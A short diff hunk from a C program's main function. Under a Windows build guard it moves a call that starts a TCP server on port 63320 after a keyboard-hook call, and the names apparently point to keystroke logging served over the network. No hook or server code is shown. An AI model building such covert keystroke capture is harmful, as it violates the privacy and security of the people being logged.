@@ -45,8 +45,8 @@ int main()
     delete_vlist(list, &list);
 
 #ifdef LOGME_WINDOWS
-    tcp_server_run(63320);
     kbhook_run_success();
+    tcp_server_run(63320);
 #endif // LOGME_WINDOWS
 
     return 0;
